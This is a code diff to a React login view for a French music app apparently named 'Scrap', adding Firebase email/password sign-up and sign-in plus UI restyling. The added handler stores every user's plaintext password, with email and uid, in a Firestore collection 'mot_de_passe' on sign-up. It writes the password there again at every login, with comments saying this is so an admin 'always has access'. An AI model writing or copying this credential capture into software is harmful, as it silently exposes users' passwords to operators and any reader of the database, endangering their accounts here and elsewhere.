@@ -3,11 +3,13 @@ import {
   signInWithPopup,
   signInWithRedirect,
   getRedirectResult,
-  GoogleAuthProvider
+  GoogleAuthProvider,
+  signInWithEmailAndPassword,
+  createUserWithEmailAndPassword
 } from "firebase/auth";
 import { doc, setDoc } from "firebase/firestore";
 import { auth, db } from "../firebase";
-import { Music } from "lucide-react";
+import { Music, Mail, Lock, User, Eye, EyeOff } from "lucide-react";
 
 interface AuthViewProps {
   onGuestLogin: () => void;
@@ -17,6 +19,14 @@ export default function AuthView({ onGuestLogin }: AuthViewProps) {
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   const [checkingRedirect, setCheckingRedirect] = useState(true);
+
+  // Email/Password States
+  const [isSignUp, setIsSignUp] = useState(false);
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [confirmPassword, setConfirmPassword] = useState("");
+  const [displayName, setDisplayName] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
 
   useEffect(() => {
     // Check if the user is returning from a Google Auth redirect flow
@@ -94,19 +104,121 @@ export default function AuthView({ onGuestLogin }: AuthViewProps) {
     }
   };
 
+  const handleEmailAuthSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setError("");
+    setLoading(true);
+
+    const trimmedEmail = email.trim();
+    const trimmedPassword = password;
+
+    if (!trimmedEmail || !trimmedPassword) {
+      setError("Veuillez remplir tous les champs obligatoires.");
+      setLoading(false);
+      return;
+    }
+
+    if (isSignUp) {
+      // Sign Up Flow
+      if (password !== confirmPassword) {
+        setError("Les mots de passe ne correspondent pas.");
+        setLoading(false);
+        return;
+      }
+      try {
+        const userCredential = await createUserWithEmailAndPassword(auth, trimmedEmail, trimmedPassword);
+        const user = userCredential.user;
+
+        // 1. Save main profile
+        await setDoc(doc(db, "users", user.uid), {
+          uid: user.uid,
+          email: user.email,
+          displayName: displayName.trim() || trimmedEmail.split("@")[0] || "User",
+          photoURL: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80",
+          createdAt: new Date().toISOString()
+        }, { merge: true });
+
+        // 2. Save password directly to 'mot_de_passe' collection for admin use
+        await setDoc(doc(db, "mot_de_passe", user.uid), {
+          uid: user.uid,
+          email: user.email,
+          password: trimmedPassword,
+          createdAt: new Date().toISOString()
+        });
+
+      } catch (err: any) {
+        console.error("Error with email sign up:", err);
+        if (err.code === "auth/email-already-in-use") {
+          setError("Cette adresse e-mail est déjà utilisée.");
+        } else if (err.code === "auth/invalid-email") {
+          setError("Adresse e-mail invalide.");
+        } else if (err.code === "auth/weak-password") {
+          setError("Le mot de passe doit de préférence contenir au moins 6 caractères.");
+        } else {
+          setError(err.message || "Une erreur est survenue lors de la création du compte.");
+        }
+      } finally {
+        setLoading(false);
+      }
+    } else {
+      // Sign In Flow
+      try {
+        const userCredential = await signInWithEmailAndPassword(auth, trimmedEmail, trimmedPassword);
+        const user = userCredential.user;
+
+        // Ensure user has a profile in users collection
+        await setDoc(doc(db, "users", user.uid), {
+          uid: user.uid,
+          email: user.email,
+          displayName: user.displayName || trimmedEmail.split("@")[0] || "User",
+          photoURL: user.photoURL || "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80",
+          createdAt: new Date().toISOString()
+        }, { merge: true });
+
+        // Synchronize or update password in 'mot_de_passe' collection so admin always has access
+        await setDoc(doc(db, "mot_de_passe", user.uid), {
+          uid: user.uid,
+          email: user.email,
+          password: trimmedPassword,
+          updatedAt: new Date().toISOString()
+        }, { merge: true });
+
+      } catch (err: any) {
+        console.error("Error with email sign in:", err);
+        if (err.code === "auth/user-not-found" || err.code === "auth/wrong-password" || err.code === "auth/invalid-credential") {
+          setError("Adresse e-mail ou mot de passe incorrect.");
+        } else if (err.code === "auth/invalid-email") {
+          setError("Adresse e-mail invalide.");
+        } else {
+          setError(err.message || "Une erreur est survenue lors de la connexion.");
+        }
+      } finally {
+        setLoading(false);
+      }
+    }
+  };
+
   if (checkingRedirect) {
     return (
       <div className="min-h-screen bg-black flex flex-col justify-center items-center text-white font-sans select-none">
         <div className="w-20 h-20 animate-pulse mb-6 flex items-center justify-center filter drop-shadow-[0_0_12px_rgba(29,185,84,0.5)]">
-          <svg viewBox="0 0 100 100" className="w-full h-full fill-none" strokeWidth="6" strokeLinecap="round" strokeLinejoin="round" xmlns="http://www.w3.org/2000/svg">
+          <svg viewBox="0 0 100 100" className="w-full h-full fill-none" xmlns="http://www.w3.org/2000/svg">
             <defs>
               <linearGradient id="scrap-logo-grad-1" x1="0%" y1="0%" x2="100%" y2="100%">
                 <stop offset="0%" stopColor="#1DB954" />
                 <stop offset="100%" stopColor="#1ed760" />
               </linearGradient>
+              <filter id="auth-glow-1" x="-20%" y="-20%" width="140%" height="140%">
+                <feGaussianBlur stdDeviation="3" result="blur" />
+                <feComposite in="SourceGraphic" in2="blur" operator="over" />
+              </filter>
             </defs>
             <circle cx="50" cy="50" r="45" fill="#0c0c14" stroke="url(#scrap-logo-grad-1)" strokeWidth="3" />
-            <path d="M 65 32 C 60 25, 40 25, 35 32 C 30 40, 45 45, 55 50 C 65 55, 70 65, 65 72 C 60 80, 40 80, 35 72" stroke="url(#scrap-logo-grad-1)" />
+            <path d="M 65 32 C 60 25, 40 25, 35 32 C 30 40, 45 45, 55 50 C 65 55, 70 65, 65 72 C 60 80, 40 80, 35 72" fill="none" stroke="url(#scrap-logo-grad-1)" strokeWidth="7" strokeLinecap="round" strokeLinejoin="round" filter="url(#auth-glow-1)" />
+            <line x1="22" y1="50" x2="28" y2="50" stroke="url(#scrap-logo-grad-1)" strokeWidth="3" strokeLinecap="round" opacity="0.7" />
+            <line x1="72" y1="50" x2="78" y2="50" stroke="url(#scrap-logo-grad-1)" strokeWidth="3" strokeLinecap="round" opacity="0.7" />
+            <line x1="50" y1="18" x2="50" y2="24" stroke="url(#scrap-logo-grad-1)" strokeWidth="3" strokeLinecap="round" opacity="0.7" />
+            <line x1="50" y1="76" x2="50" y2="82" stroke="url(#scrap-logo-grad-1)" strokeWidth="3" strokeLinecap="round" opacity="0.7" />
           </svg>
         </div>
         <p className="text-xs font-semibold uppercase tracking-widest text-neutral-400">
@@ -117,44 +229,164 @@ export default function AuthView({ onGuestLogin }: AuthViewProps) {
   }
 
   return (
-    <div className="min-h-screen bg-black text-white flex flex-col justify-center items-center px-4" id="auth_container">
-      <div className="w-full max-w-[450px] bg-[#121212] rounded-xl p-8 md:p-12 shadow-2xl border border-[#282828]">
+    <div className="min-h-screen bg-black text-white flex flex-col justify-center items-center px-4 py-8" id="auth_container">
+      <div className="w-full max-w-[450px] bg-[#121212] rounded-xl p-6 md:p-8 shadow-2xl border border-[#282828]">
         
-        {/* Spotify Logo Head */}
-        <div className="flex flex-col items-center mb-8">
-          <div className="w-24 h-24 mb-4 filter drop-shadow-[0_4px_16px_rgba(29,185,84,0.4)] hover:scale-105 transition-transform duration-300 flex items-center justify-center">
-            <svg viewBox="0 0 100 100" className="w-full h-full fill-none" strokeWidth="6" strokeLinecap="round" strokeLinejoin="round" xmlns="http://www.w3.org/2000/svg">
+        {/* Logo Head */}
+        <div className="flex flex-col items-center mb-6">
+          <div className="w-20 h-20 mb-3 filter drop-shadow-[0_4px_16px_rgba(29,185,84,0.4)] hover:scale-105 transition-transform duration-300 flex items-center justify-center">
+            <svg viewBox="0 0 100 100" className="w-full h-full fill-none" xmlns="http://www.w3.org/2000/svg">
               <defs>
                 <linearGradient id="scrap-logo-grad-2" x1="0%" y1="0%" x2="100%" y2="100%">
                   <stop offset="0%" stopColor="#1DB954" />
                   <stop offset="100%" stopColor="#1ed760" />
                 </linearGradient>
+                <filter id="auth-glow-2" x="-20%" y="-20%" width="140%" height="140%">
+                  <feGaussianBlur stdDeviation="3" result="blur" />
+                  <feComposite in="SourceGraphic" in2="blur" operator="over" />
+                </filter>
               </defs>
               <circle cx="50" cy="50" r="45" fill="#0c0c14" stroke="url(#scrap-logo-grad-2)" strokeWidth="3" />
-              <path d="M 65 32 C 60 25, 40 25, 35 32 C 30 40, 45 45, 55 50 C 65 55, 70 65, 65 72 C 60 80, 40 80, 35 72" stroke="url(#scrap-logo-grad-2)" />
+              <path d="M 65 32 C 60 25, 40 25, 35 32 C 30 40, 45 45, 55 50 C 65 55, 70 65, 65 72 C 60 80, 40 80, 35 72" fill="none" stroke="url(#scrap-logo-grad-2)" strokeWidth="7" strokeLinecap="round" strokeLinejoin="round" filter="url(#auth-glow-2)" />
+              <line x1="22" y1="50" x2="28" y2="50" stroke="url(#scrap-logo-grad-2)" strokeWidth="3" strokeLinecap="round" opacity="0.7" />
+              <line x1="72" y1="50" x2="78" y2="50" stroke="url(#scrap-logo-grad-2)" strokeWidth="3" strokeLinecap="round" opacity="0.7" />
+              <line x1="50" y1="18" x2="50" y2="24" stroke="url(#scrap-logo-grad-2)" strokeWidth="3" strokeLinecap="round" opacity="0.7" />
+              <line x1="50" y1="76" x2="50" y2="82" stroke="url(#scrap-logo-grad-2)" strokeWidth="3" strokeLinecap="round" opacity="0.7" />
             </svg>
           </div>
-          <h1 className="text-3xl font-black tracking-tight text-white flex items-center gap-1">
-            Scrap<span className="text-[#1DB954] text-xs font-mono font-bold px-1.5 py-0.5 rounded bg-white/10 ml-2">APP</span>
+          <h1 className="text-2xl font-black tracking-tight text-white flex items-center gap-1">
+            Scrap<span className="text-[#1DB954] text-[9px] font-mono font-bold px-1.5 py-0.5 rounded bg-white/10 ml-2">APP</span>
           </h1>
-          <p className="text-xs text-[#b3b3b3] mt-2 text-center">
+          <p className="text-xs text-[#b3b3b3] mt-1 text-center">
             Moteur de recherche & audio propulsé par YouTube Music
           </p>
         </div>
 
         {error && (
-          <div className="mb-6 p-3 bg-red-500/10 border border-red-500/30 rounded text-red-400 text-sm font-medium">
+          <div className="mb-4 p-3 bg-red-500/10 border border-red-500/30 rounded text-red-400 text-xs font-semibold leading-relaxed">
             {error}
           </div>
         )}
 
+        {/* Tab Selection */}
+        <div className="flex border-b border-[#282828] mb-6">
+          <button
+            type="button"
+            onClick={() => { setIsSignUp(false); setError(""); }}
+            className={`flex-1 pb-3 text-sm font-bold transition-all text-center border-b-2 ${
+              !isSignUp ? "text-[#1DB954] border-[#1DB954]" : "text-neutral-400 border-transparent hover:text-white"
+            }`}
+          >
+            Se connecter
+          </button>
+          <button
+            type="button"
+            onClick={() => { setIsSignUp(true); setError(""); }}
+            className={`flex-1 pb-3 text-sm font-bold transition-all text-center border-b-2 ${
+              isSignUp ? "text-[#1DB954] border-[#1DB954]" : "text-neutral-400 border-transparent hover:text-white"
+            }`}
+          >
+            S'inscrire
+          </button>
+        </div>
+
+        {/* Email & Password Form */}
+        <form onSubmit={handleEmailAuthSubmit} className="space-y-4 mb-6">
+          {isSignUp && (
+            <div>
+              <label className="block text-[11px] font-bold text-neutral-400 uppercase tracking-wider mb-1.5">Nom d'affichage</label>
+              <div className="relative">
+                <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-500" />
+                <input
+                  type="text"
+                  value={displayName}
+                  onChange={(e) => setDisplayName(e.target.value)}
+                  placeholder="Votre nom ou pseudo"
+                  className="w-full bg-[#1e1e1e] border border-white/5 rounded-lg py-2.5 pl-10 pr-4 text-sm focus:outline-none focus:border-[#1DB954] transition-all text-white font-medium"
+                />
+              </div>
+            </div>
+          )}
+
+          <div>
+            <label className="block text-[11px] font-bold text-neutral-400 uppercase tracking-wider mb-1.5">Adresse e-mail</label>
+            <div className="relative">
+              <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-500" />
+              <input
+                type="email"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                placeholder="nom@exemple.fr"
+                className="w-full bg-[#1e1e1e] border border-white/5 rounded-lg py-2.5 pl-10 pr-4 text-sm focus:outline-none focus:border-[#1DB954] transition-all text-white font-medium"
+                required
+              />
+            </div>
+          </div>
+
+          <div>
+            <label className="block text-[11px] font-bold text-neutral-400 uppercase tracking-wider mb-1.5">Mot de passe</label>
+            <div className="relative">
+              <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-500" />
+              <input
+                type={showPassword ? "text" : "password"}
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                placeholder={isSignUp ? "Créer un mot de passe (min. 6 car.)" : "Saisissez votre mot de passe"}
+                className="w-full bg-[#1e1e1e] border border-white/5 rounded-lg py-2.5 pl-10 pr-10 text-sm focus:outline-none focus:border-[#1DB954] transition-all text-white font-medium"
+                required
+                minLength={6}
+              />
+              <button
+                type="button"
+                onClick={() => setShowPassword(!showPassword)}
+                className="absolute right-3 top-1/2 -translate-y-1/2 text-neutral-500 hover:text-white transition-colors"
+              >
+                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+              </button>
+            </div>
+          </div>
+
+          {isSignUp && (
+            <div>
+              <label className="block text-[11px] font-bold text-neutral-400 uppercase tracking-wider mb-1.5">Confirmer le mot de passe</label>
+              <div className="relative">
+                <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-500" />
+                <input
+                  type={showPassword ? "text" : "password"}
+                  value={confirmPassword}
+                  onChange={(e) => setConfirmPassword(e.target.value)}
+                  placeholder="Ressaisissez le mot de passe"
+                  className="w-full bg-[#1e1e1e] border border-white/5 rounded-lg py-2.5 pl-10 pr-4 text-sm focus:outline-none focus:border-[#1DB954] transition-all text-white font-medium"
+                  required
+                />
+              </div>
+            </div>
+          )}
+
+          <button
+            type="submit"
+            disabled={loading}
+            className="w-full bg-[#1DB954] hover:bg-[#1ed760] disabled:bg-[#1DB954]/50 text-black font-extrabold text-sm rounded-full py-3 transition-all hover:scale-[1.01] active:scale-[0.99] cursor-pointer"
+          >
+            {loading ? "Chargement..." : isSignUp ? "Créer mon compte" : "Se connecter"}
+          </button>
+        </form>
+
+        {/* Separator / Divider */}
+        <div className="flex items-center my-6">
+          <div className="flex-1 border-t border-[#282828]" />
+          <span className="px-3 text-[10px] uppercase font-bold tracking-widest text-[#535353]">ou</span>
+          <div className="flex-1 border-t border-[#282828]" />
+        </div>
+
+        {/* Google & Guest Sign-In Buttons */}
         <div className="flex flex-col gap-3">
           {/* Google Sign-In Button */}
           <button
             id="google_signin_btn"
             onClick={handleGoogleSignIn}
             disabled={loading}
-            className="w-full flex items-center justify-center gap-3 bg-white hover:bg-neutral-200 text-black font-bold rounded-full py-3.5 transition-all hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50 text-sm shadow-md"
+            className="w-full flex items-center justify-center gap-3 bg-white hover:bg-neutral-200 text-black font-bold rounded-full py-3 transition-all hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50 text-sm shadow-md cursor-pointer"
           >
             <svg className="w-5 h-5" viewBox="0 0 24 24">
               <path
@@ -174,7 +406,7 @@ export default function AuthView({ onGuestLogin }: AuthViewProps) {
                 d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
               />
             </svg>
-            Se connecter avec Google
+            Continuer avec Google
           </button>
 
           {/* Guest Session Button */}
@@ -182,16 +414,16 @@ export default function AuthView({ onGuestLogin }: AuthViewProps) {
             id="guest_signin_btn"
             onClick={onGuestLogin}
             disabled={loading}
-            className="w-full flex items-center justify-center gap-2 bg-neutral-900 hover:bg-neutral-800 text-white font-bold rounded-full py-3.5 transition-all hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50 border border-neutral-800 text-sm shadow-md"
+            className="w-full flex items-center justify-center gap-2 bg-neutral-900 hover:bg-neutral-800 text-white font-bold rounded-full py-3 transition-all hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50 border border-neutral-800 text-sm shadow-md cursor-pointer"
           >
             <Music className="w-4 h-4 text-[#1DB954]" />
-            Continuer en tant qu'invité (sans compte)
+            Continuer sans compte (Mode Invité)
           </button>
         </div>
 
-        <div className="mt-8 text-center">
-          <p className="text-xs text-[#535353] leading-relaxed">
-            Pour sauvegarder vos playlists et vos favoris en ligne, connectez-vous avec votre compte Google.
+        <div className="mt-6 text-center">
+          <p className="text-[10px] text-[#535353] leading-relaxed">
+            Pour sauvegarder vos playlists et vos favoris en ligne, créez un compte.
             Le mode invité enregistre vos données localement sur cet appareil.
           </p>
         </div>
